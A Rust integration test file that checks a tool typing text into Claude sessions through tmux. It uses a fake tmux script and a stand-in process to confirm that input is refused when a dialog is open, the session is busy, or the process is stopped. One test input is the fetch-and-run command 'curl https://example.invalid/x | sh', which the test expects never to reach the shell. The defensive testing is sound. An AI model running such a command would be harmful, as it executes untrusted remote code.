//! Typing into a foreign tmux session, against a FAKE `tmux`
//! (`MOTHER_CLAUDE_TMUX`, a shell script logging its argv) and a real process
//! in a pseudo-terminal (`script`) standing in for claude, so `ps` sees a
//! genuine foreground process group, a stopped process and a tty.
//!
//! Nothing here touches `~/.claude` or runs `claude` or a real tmux.

#![cfg(unix)]

use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;

use axum::http::HeaderMap;
use mother_claude_lib::claude::live::LiveSession;
use mother_claude_lib::claude::model::{SessionStatus, SessionSummary};
use mother_claude_lib::claude::{tmux, ClaudeHome};
use mother_claude_lib::server::auth::Auth;
use mother_claude_lib::server::context::{ClientContext, Ingress, Principal};
use mother_claude_lib::state::{AppState, Inner, ServerConfig};

const S: &str = "0a1b2c3d-1111-4222-8333-444455556666";
const TARGET: &str = "main:@1.%1";

const FAKE_TMUX: &str = r#"#!/bin/sh
D='@DIR@'
[ "$1" = "-S" ] && shift 2
printf '%s\n' "$*" >> "$D/log"
case "$1" in
  list-panes) cat "$D/panes" ;;
  capture-pane) cat "$D/screen" 2>/dev/null ;;
  send-keys) if [ "$4" = "-l" ] && [ -f "$D/on-type" ]; then sh "$D/on-type"; fi ;;
  load-buffer) cat >/dev/null ;;
esac
exit 0
"#;

/// A process in its own pseudo-terminal, where it is the foreground job.
struct StandIn {
    script: tokio::process::Child,
    pid: u32,
    tty: String,
}

impl Drop for StandIn {
    fn drop(&mut self) {
        // SAFETY: plain signals to processes this test started.
        unsafe {
            libc::kill(self.pid as i32, libc::SIGCONT);
            libc::kill(self.pid as i32, libc::SIGKILL);
        }
        let _ = self.script.start_kill();
    }
}

async fn ps(args: &[&str]) -> String {
    let out = tokio::process::Command::new("ps")
        .args(args)
        .env("LC_ALL", "C")
        .output()
        .await
        .unwrap();
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

async fn stand_in() -> StandIn {
    let mut cmd = tokio::process::Command::new("script");
    if cfg!(target_os = "macos") {
        cmd.args(["-q", "/dev/null", "/bin/sleep", "60"]);
    } else {
        cmd.args(["-qec", "/bin/sleep 60", "/dev/null"]);
    }
    let script = cmd
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .kill_on_drop(true)
        .spawn()
        .unwrap();
    let parent = script.id().unwrap();
    for _ in 0..100 {
        let out = tokio::process::Command::new("pgrep")
            .args(["-P", &parent.to_string()])
            .output()
            .await
            .unwrap();
        if let Some(pid) = String::from_utf8_lossy(&out.stdout)
            .lines()
            .find_map(|l| l.trim().parse::<u32>().ok())
        {
            let tty = ps(&["-o", "tty=", "-p", &pid.to_string()]).await;
            if !tty.is_empty() && tty != "??" && tty != "?" {
                let tty = if tty.starts_with('/') {
                    tty
                } else {
                    format!("/dev/{tty}")
                };
                return StandIn { script, pid, tty };
            }
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("the stand-in never got a terminal");
}

struct Fixture {
    st: AppState,
    home: tempfile::TempDir,
    fake: tempfile::TempDir,
    claude: StandIn,
}

impl Fixture {
    async fn new() -> Self {
        let fake = tempfile::tempdir().unwrap();
        let bin = fake.path().join("tmux");
        std::fs::write(
            &bin,
            FAKE_TMUX.replace("@DIR@", &fake.path().to_string_lossy()),
        )
        .unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        // Read once, when the state first looks for tmux (one test per
        // process uses it).
        std::env::set_var("MOTHER_CLAUDE_TMUX", &bin);
        let home = tempfile::tempdir().unwrap();
        let st = Inner::new(
            ClaudeHome::with_base(home.path()),
            ServerConfig {
                host: "127.0.0.1".into(),
                port: 0,
            },
            Auth::ephemeral(),
        );
        let claude = stand_in().await;
        std::fs::write(
            fake.path().join("panes"),
            format!("{} %1 {}\n", claude.pid, claude.tty),
        )
        .unwrap();
        let f = Self {
            st,
            home,
            fake,
            claude,
        };
        f.pidfile("idle", "");
        // The roster's cached view (the monitor would refresh it later).
        f.st.live.insert_for_test(LiveSession {
            pid: Some(f.claude.pid),
            session_id: Some(S.into()),
            status: Some("idle".into()),
            tmux: Some(TARGET.into()),
            ..Default::default()
        });
        f.screen("  ? for shortcuts\n");
        f
    }

    fn pidfile_path(&self) -> PathBuf {
        self.home
            .path()
            .join("sessions")
            .join(format!("{}.json", self.claude.pid))
    }

    fn pidfile(&self, status: &str, waiting: &str) {
        let path = self.pidfile_path();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            format!(
                r#"{{"pid":{},"sessionId":"{S}","status":"{status}","waitingFor":"{waiting}","tmux":"{TARGET}"}}"#,
                self.claude.pid
            ),
        )
        .unwrap();
    }

    fn screen(&self, text: &str) {
        std::fs::write(self.fake.path().join("screen"), text).unwrap();
    }

    /// A shell snippet the fake runs when text is typed.
    fn on_type(&self, script: &str) {
        let path = self.fake.path().join("on-type");
        if script.is_empty() {
            let _ = std::fs::remove_file(path);
        } else {
            std::fs::write(path, script).unwrap();
        }
    }

    /// The tmux calls since the last look.
    fn calls(&self) -> Vec<String> {
        let path = self.fake.path().join("log");
        let text = std::fs::read_to_string(&path).unwrap_or_default();
        let _ = std::fs::remove_file(&path);
        text.lines().map(str::to_string).collect()
    }

    fn summary(&self) -> SessionSummary {
        SessionSummary {
            id: S.into(),
            pid: Some(self.claude.pid),
            tmux_pane: Some(TARGET.into()),
            status: SessionStatus::Idle,
            live: true,
            ..Default::default()
        }
    }

    async fn send(&self, ctx: &ClientContext, text: &str) -> Result<(), String> {
        tmux::send_text_as(&self.st, ctx, &self.summary(), text)
            .await
            .map_err(|e| e.code)
    }
}

fn ctx(principal: Principal) -> ClientContext {
    let peer: SocketAddr = "127.0.0.1:5000".parse().unwrap();
    let mut c = ClientContext::new(Ingress::Loopback, peer, &HeaderMap::new(), false);
    c.principal = principal;
    c
}

fn typed(calls: &[String], text: &str) -> bool {
    calls
        .iter()
        .any(|c| c == &format!("send-keys -t %1 -l -- {text}"))
}

fn pressed(calls: &[String], key: &str) -> bool {
    calls.iter().any(|c| c == &format!("send-keys -t %1 {key}"))
}

fn sh_quote(p: &Path) -> String {
    format!("'{}'", p.to_string_lossy().replace('\'', r"'\''"))
}

#[tokio::test]
async fn typing_needs_claude_in_front_of_a_quiet_terminal() {
    let f = Fixture::new().await;
    let desk = ctx(Principal::Desktop);
    let phone = ctx(Principal::Device {
        id: "phone".into(),
        allow_dangerous: false,
    });

    // Idle, nothing on screen, claude in front: typed, then Enter.
    f.send(&phone, "run the tests").await.unwrap();
    let calls = f.calls();
    assert!(typed(&calls, "run the tests"), "{calls:?}");
    assert!(pressed(&calls, "Enter"));

    // A dialog on screen: nothing is typed.
    f.screen(" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n\n Esc to cancel\n");
    assert_eq!(f.send(&desk, "hello").await.unwrap_err(), "session_waiting");
    assert!(!f.calls().iter().any(|c| c.starts_with("send-keys")));
    f.screen("  ? for shortcuts\n");

    // A dialog opens while the text is typed: cleared, never confirmed.
    f.on_type(&format!(
        "printf ' ❯ 1. Yes\\n Esc to cancel\\n' > {}\n",
        sh_quote(&f.fake.path().join("screen"))
    ));
    assert_eq!(f.send(&desk, "hello").await.unwrap_err(), "session_waiting");
    let calls = f.calls();
    assert!(typed(&calls, "hello"));
    assert!(
        pressed(&calls, "C-u") && !pressed(&calls, "Enter"),
        "{calls:?}"
    );
    f.screen("  ? for shortcuts\n");

    // The pidfile turns `waiting` while typing; the monitor's cached roster
    // still says idle. The fresh read before Enter catches it.
    let waiting = format!(
        r#"{{"pid":{},"sessionId":"{S}","status":"waiting","waitingFor":"permission prompt"}}"#,
        f.claude.pid
    );
    f.on_type(&format!(
        "printf '%s' {} > {}\n",
        sh_quote(Path::new(&waiting)),
        sh_quote(&f.pidfile_path())
    ));
    assert_eq!(f.send(&desk, "hello").await.unwrap_err(), "session_waiting");
    let calls = f.calls();
    assert!(
        pressed(&calls, "C-u") && !pressed(&calls, "Enter"),
        "{calls:?}"
    );
    assert_eq!(
        f.st.live.get(S).unwrap().status.as_deref(),
        Some("idle"),
        "the check did not need the roster"
    );
    f.on_type("");
    // ...and it is refused up front while the pidfile says so.
    assert_eq!(f.send(&desk, "hello").await.unwrap_err(), "session_waiting");
    assert!(f.calls().iter().all(|c| !c.starts_with("send-keys")));

    // Busy: a phone's text starting with a digit could pick a dialog option.
    f.pidfile("busy", "");
    assert_eq!(
        f.send(&phone, "2 more things").await.unwrap_err(),
        "session_busy"
    );
    assert!(f.calls().iter().all(|c| !c.starts_with("send-keys")));
    f.pidfile("idle", "");

    // Ctrl+Z: claude is stopped and its shell has the terminal. Nothing may
    // be typed (the shell would run it) — and no C-u either.
    // SAFETY: a plain signal to the stand-in process this test started.
    unsafe {
        libc::kill(f.claude.pid as i32, libc::SIGSTOP);
    }
    for _ in 0..50 {
        if ps(&["-o", "stat=", "-p", &f.claude.pid.to_string()])
            .await
            .contains('T')
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert_eq!(
        f.send(&desk, "curl https://example.invalid/x | sh")
            .await
            .unwrap_err(),
        "session_not_foreground"
    );
    assert!(f.calls().iter().all(|c| !c.starts_with("send-keys")));
    assert_eq!(
        tmux::send_key(&f.st, &f.summary(), "Escape")
            .await
            .unwrap_err()
            .code,
        "session_not_foreground"
    );
    // SAFETY: as above.
    unsafe {
        libc::kill(f.claude.pid as i32, libc::SIGCONT);
    }
    for _ in 0..50 {
        if !ps(&["-o", "stat=", "-p", &f.claude.pid.to_string()])
            .await
            .contains('T')
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    f.send(&desk, "back again").await.unwrap();
    assert!(typed(&f.calls(), "back again"));
}
